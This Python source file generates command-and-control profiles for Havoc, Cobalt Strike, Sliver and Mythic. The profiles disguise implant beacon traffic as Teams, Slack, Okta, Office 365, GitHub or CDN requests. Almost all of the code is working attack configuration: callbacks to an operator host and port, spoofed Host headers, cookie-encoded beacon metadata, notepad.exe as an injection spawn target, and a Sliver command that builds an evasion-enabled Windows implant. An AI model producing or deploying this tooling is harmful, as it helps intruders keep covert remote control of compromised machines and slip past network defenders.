"""
C2 malleable profile generator.
Produces Havoc (v0.8+) and Cobalt Strike malleable C2 profile text that mimics
named SaaS platforms to blend beacon traffic with legitimate user activity.
"""
import random
import string
from dataclasses import dataclass

SUPPORTED_PLATFORMS = ("teams", "slack", "okta", "o365", "github", "generic")

_RANDOM_HEADER_LEN: dict[str, int] = {"o365": 16, "generic": 12}

_PLATFORM_CONFIG: dict[str, dict] = {
    "teams": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.6.00.4472 Chrome/90.0.4430.212 Electron/12.0.7 Safari/537.36",
        "host": "teams.microsoft.com",
        "get_uri": "/api/v2/user/presence",
        "post_uri": "/api/v2/calling/callAgent/register",
        "content_type": "application/json",
        "x_header": "X-MS-Client-Version",
        "x_header_val": "1.6.00.4472",
    },
    "slack": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Slack/4.35.126",
        "host": "slack.com",
        "get_uri": "/api/rtm.connect",
        "post_uri": "/api/chat.postMessage",
        "content_type": "application/json; charset=utf-8",
        "x_header": "X-Slack-Client-Version",
        "x_header_val": "4.35.126",
    },
    "okta": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "host": "login.okta.com",
        "get_uri": "/api/v1/sessions/me",
        "post_uri": "/api/v1/authn",
        "content_type": "application/json",
        "x_header": "X-Okta-User-Agent-Extended",
        "x_header_val": "okta-signin-widget/7.8.1",
    },
    "o365": {
        "user_agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.16827; Pro)",
        "host": "outlook.office365.com",
        "get_uri": "/owa/auth/logon.aspx",
        "post_uri": "/api/v2.0/me/sendMail",
        "content_type": "application/json",
        "x_header": "X-OWA-CorrelationId",
        "x_header_val": None,
    },
    "github": {
        "user_agent": "github-cli/2.40.1",
        "host": "api.github.com",
        "get_uri": "/user",
        "post_uri": "/repos/notifications",
        "content_type": "application/vnd.github+json",
        "x_header": "X-GitHub-Api-Version",
        "x_header_val": "2022-11-28",
    },
    "generic": {
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "host": "cdn.cloudflare.com",
        "get_uri": "/assets/main.js",
        "post_uri": "/analytics/collect",
        "content_type": "application/octet-stream",
        "x_header": "X-Request-ID",
        "x_header_val": None,
    },
}


@dataclass
class C2Profile:
    platform: str
    havoc_profile: str
    cobalt_strike_profile: str
    sliver_profile: str = ""
    mythic_profile: str = ""


def _havoc_profile(cfg: dict, lhost: str, lport: int) -> str:
    return f"""\
# Havoc C2 Profile — {cfg['host']} mimicry
# Compatible with Havoc v0.8+

Teamserver {{
    Host = "{lhost}"
    Port = {lport}
}}

Operators {{
    user "operator" {{
        Password = "changeme"
    }}
}}

Demon {{
    Sleep  = 5
    Jitter = 20

    Injection {{
        Spawn64 = "C:\\\\Windows\\\\System32\\\\notepad.exe"
        Spawn32 = "C:\\\\Windows\\\\SysWOW64\\\\notepad.exe"
    }}
}}

Listeners {{
    Http {{
        Name       = "{cfg['host']}-listener"
        Hosts      = ["{lhost}"]
        PortBind   = {lport}
        PortConn   = {lport}
        UserAgent  = "{cfg['user_agent']}"
        Uris       = ["{cfg['get_uri']}", "{cfg['post_uri']}"]
        Headers    = [
            "Host: {cfg['host']}",
            "Accept: application/json, text/plain, */*",
            "{cfg['x_header']}: {cfg['x_header_val']}"
        ]
    }}
}}"""


def _cs_profile(cfg: dict, lhost: str, lport: int) -> str:
    return f"""\
# Cobalt Strike Malleable C2 Profile — {cfg['host']} mimicry
# Tested against CS 4.9

set useragent "{cfg['user_agent']}";
set sleeptime "5000";
set jitter    "20";
set maxdns    "255";

https-get {{
    set uri "{cfg['get_uri']}";

    client {{
        header "Host"           "{cfg['host']}";
        header "Accept"         "application/json, text/plain, */*";
        header "{cfg['x_header']}" "{cfg['x_header_val']}";

        metadata {{
            base64url;
            prepend "session=";
            header "Cookie";
        }}
    }}

    server {{
        header "Content-Type" "{cfg['content_type']}";
        header "Cache-Control" "no-cache, no-store";

        output {{
            base64url;
            print;
        }}
    }}
}}

https-post {{
    set uri "{cfg['post_uri']}";

    client {{
        header "Host"           "{cfg['host']}";
        header "Content-Type"  "{cfg['content_type']}";
        header "{cfg['x_header']}" "{cfg['x_header_val']}";

        id {{
            base64url;
            prepend "id=";
            parameter "cid";
        }}

        output {{
            base64url;
            print;
        }}
    }}

    server {{
        header "Content-Type" "{cfg['content_type']}";

        output {{
            base64url;
            print;
        }}
    }}
}}"""


def _sliver_profile(cfg: dict, lhost: str, lport: int) -> str:
    """
    Sliver HTTP/S C2 traffic profile.

    Sliver loads JSON traffic encoders / HTTP profiles via `implant http profile`.
    The block below is the operator-side `sliver` console invocation plus the
    profile JSON that customises the HTTP transport. Drop the JSON into the
    `extensions` directory or use `c2profile --import`.
    """
    return f"""\
# Sliver HTTP profile — {cfg['host']} mimicry
# Generate the implant:
#   sliver > generate --http {lhost}:{lport} --os windows --arch amd64 \\
#       --evasion --skip-symbols --format exe --save ./implant.exe
#
# c2 profile JSON (save to ~/.sliver-client/configs/{cfg['host']}.json):
{{
  "implant_config": {{
    "polling_interval": 5000,
    "jitter": 20,
    "max_connection_errors": 1000
  }},
  "http": {{
    "user_agent": "{cfg['user_agent']}",
    "url_parameters": {{
      "session": "16,base64url"
    }},
    "headers": {{
      "Host": "{cfg['host']}",
      "Accept": "application/json, text/plain, */*",
      "{cfg['x_header']}": "{cfg['x_header_val']}"
    }},
    "poll_paths": ["{cfg['get_uri']}"],
    "session_paths": ["{cfg['post_uri']}"],
    "close_paths": ["/api/v2/user/logout"],
    "files": [
      {{
        "path": "/assets",
        "ext": ".js",
        "content_type": "application/javascript"
      }}
    ]
  }}
}}"""


def _mythic_profile(cfg: dict, lhost: str, lport: int) -> str:
    """
    Mythic HTTP C2 profile YAML.

    Mythic loads C2 profiles via the `c2_profiles/http/config.json` mount.
    This template produces a config that mimics the named SaaS platform.
    """
    return f"""\
# Mythic HTTP C2 profile — {cfg['host']} mimicry
# Place in: Mythic/Mythic_CLI/c2_profiles/http/config.json
{{
  "instances": [
    {{
      "port": {lport},
      "key_exchange": true,
      "ConfigCheckSleep": 10,
      "payloads": ["apollo", "merlin", "poseidon"],
      "server_headers": {{
        "Server": "nginx",
        "Content-Type": "{cfg['content_type']}"
      }},
      "ssl": true,
      "agent_config": {{
        "headers": {{
          "User-Agent": "{cfg['user_agent']}",
          "Host": "{cfg['host']}",
          "{cfg['x_header']}": "{cfg['x_header_val']}",
          "Accept": "application/json, text/plain, */*"
        }},
        "post_uri": "{cfg['post_uri']}",
        "get_uri": "{cfg['get_uri']}",
        "callback_host": "https://{lhost}",
        "callback_port": {lport},
        "callback_interval": 5,
        "callback_jitter": 20,
        "encrypted_exchange_check": true
      }}
    }}
  ]
}}"""


def generate_profile(platform: str, lhost: str, lport: int) -> C2Profile:
    if platform not in _PLATFORM_CONFIG:
        raise ValueError(f"Unknown platform '{platform}'. Supported: {', '.join(SUPPORTED_PLATFORMS)}")
    cfg = dict(_PLATFORM_CONFIG[platform])
    if platform in _RANDOM_HEADER_LEN:
        cfg["x_header_val"] = "".join(
            random.choices(string.ascii_lowercase + string.digits, k=_RANDOM_HEADER_LEN[platform])
        )
    return C2Profile(
        platform=platform,
        havoc_profile=_havoc_profile(cfg, lhost, lport),
        cobalt_strike_profile=_cs_profile(cfg, lhost, lport),
        sliver_profile=_sliver_profile(cfg, lhost, lport),
        mythic_profile=_mythic_profile(cfg, lhost, lport),
    )
